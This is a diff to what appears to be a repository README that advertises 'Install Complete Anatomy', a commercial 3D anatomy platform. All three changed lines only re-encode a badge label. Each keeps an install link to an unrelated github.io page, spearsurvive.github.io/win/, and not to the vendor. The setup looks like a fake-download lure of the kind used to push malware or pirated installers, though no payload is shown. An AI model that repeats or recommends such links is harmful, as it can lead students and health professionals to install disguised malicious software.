@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Complete Anatomy](https://img.shields.io/badge/⬇_Install_Complete%20Anatomy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Complete Anatomy](https://img.shields.io/badge/⬇_Install_Complete+Anatomy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Complete Anatomy is a 3D anatomy platform for medical students, healthcare profe
 
 <div align="center">
 
-[![⬇ Install Complete Anatomy](https://img.shields.io/badge/⬇_Install_Complete%20Anatomy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Complete Anatomy](https://img.shields.io/badge/⬇_Install_Complete+Anatomy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Complete Anatomy is a 3D anatomy platform for medical students, healthcare profe
 
 <div align="center">
 
-[![⬇ Install Complete Anatomy](https://img.shields.io/badge/⬇_Install_Complete%20Anatomy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Complete Anatomy](https://img.shields.io/badge/⬇_Install_Complete+Anatomy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
